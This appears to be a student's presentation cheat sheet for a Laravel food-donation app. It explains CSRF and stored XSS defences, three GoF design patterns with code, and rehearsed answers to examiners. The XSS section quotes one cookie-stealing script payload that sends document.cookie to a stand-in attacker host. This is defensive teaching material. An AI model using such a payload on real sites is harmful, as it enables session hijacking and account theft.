🛡️ Software Security Defense (Real Threats — NO Basic Validation)
NOT BASIC INPUT VALIDATION

Threat 1: Cross-Site Request Forgery (CSRF — OWASP A05)

The Attack: Hacker creates an external site with a hidden form pointing to http://127.0.0.1:8000/donations. A logged-in donor's browser automatically attaches session cookies and submits spam food.
Why validation fails: Form validation checks data format (string/number). Since the hacker's form sends valid text, validation passes 100%! It cannot verify request origin.
Defense: Synchronizer Token (donations/create.blade.php Line 18). @csrf generates a secret 256-bit token. Laravel middleware blocks invalid tokens with HTTP 419.

📄 View CSRF Code (Line 18)▼

    @csrf <!-- Generates secret random session token -->
    <input type="text" name="title" required>
</form>

Threat 2: Stored Cross-Site Scripting (Stored XSS — OWASP A07)

The Attack: Attacker types <script>fetch('hacker.com?c='+document.cookie)</script> into the food description. When users view the food list, the script steals cookies.
Why validation fails: We cannot ban < or > because donors write legitimate notes like <Fresh Bread> or Qty < 50.
Defense: Context-Aware Escaping (donations/show.blade.php Line 51). Blade's {{ $donation->description }} automatically calls htmlspecialchars(), converting <script> into harmless &lt;script&gt;.

🎯 Design Pattern: Factory Method Pattern (GoF Creational)
🗣️ Look Tutor in the Eye & Say:
"The Factory Method Pattern defines an interface or abstract class for creating an object, but lets subclasses decide which exact class to instantiate."

Why we use it: NutriShare has 4 user types with different setup logic (NGOs require license documents, Admins require audit logging). Factory Method delegates object creation to clean subclasses (NgoCreator, DonorCreator, AdminCreator).

📄 View Factory Method Code▼ 
// app/Services/UserFactory/UserCreator.php (Lines 38-50)
abstract class UserCreator {
    abstract public function createUser(array $data): User;

    public static function resolve(string $role): UserCreator {
        return match ($role) {
            'ngo'   => new NgoCreator(),
            'donor' => new DonorCreator(),
            'admin' => new AdminCreator(),
            default => throw new InvalidArgumentException("Unknown role: {$role}"),
        };
    }
}

Q1: Difference between Simple Factory and Factory Method?

🎯 Design Pattern: State Pattern (GoF Behavioural)
🗣️ Look Tutor in the Eye & Say:
"The State Pattern allows an object to alter its behavior when its internal state changes. The object will appear to change its class."

Why we use it: Food claims follow strict legal lifecycles. Nested if/else checks become buggy as new steps are added. The State Pattern encapsulates each state's legal actions into clean classes (PendingState, ApprovedState, CollectedState).

📄 View State Pattern Code (Claim.php)▼ 
// app/Models/Claim.php (Lines 93-98)
public function getStateObject(): ClaimState {
    return match ($this->status) {
        'pending'   => new PendingState($this),
        'approved'  => new ApprovedState($this),
        'collected' => new CollectedState($this),
        default     => throw new InvalidStateException("Unknown state"),
    };
}

🎯 Design Pattern: Strategy Pattern (GoF Behavioural)
🗣️ Look Tutor in the Eye & Say:
"The Strategy Pattern defines a family of algorithms, encapsulates each one, and makes them interchangeable. Strategy lets the algorithm vary independently from clients that use it."

Why we use it: Warehouse alerts must reach managers via different channels (Email for full logs, SMS for urgent temperature spikes). Strategy encapsulates each channel, allowing new channels (like WhatsApp) to be added without changing warehouse code.

📄 View Strategy Code (NotificationDispatcher.php)▼ 
// app/Strategies/Notification/NotificationDispatcher.php
class NotificationDispatcher {
    public function dispatch(User $user, string $message): bool {
        $strategy = match ($user->notification_preference) {
            'sms'   => new SmsNotificationStrategy(),
            default => new EmailNotificationStrategy(),
        };
        return $strategy->send($user, $message);
    }
}

❓ Top 4 Tough Questions & Answers:
Q1: When do you use Strategy vs State Pattern?
Answer: "Use Strategy when you have different interchangeable ways of doing the same task (Email vs SMS) chosen by user/config. Use State when an object's behavior changes based on its lifecycle status (Pending -> Approved -> Collected)."
Q2: Why is CRLF Log Injection dangerous?
Answer: "Automated SIEM security monitors parse logs. Injected fake log lines can forge fraudulent admin audit trails or blind security teams to attacks."
Q3: How do HMAC Signed URLs stop replay attacks?
Answer: "We use temporarySignedRoute which bakes in an expiration timestamp. After 30 minutes, even if the URL and signature are intact, Laravel rejects it with HTTP 403 Expired."
Q4: What if an external warehouse API goes down?
Answer: "Our HTTP client uses a strict 5-second timeout and fails closed, falling back to local cached facility telemetry rather than crashing."
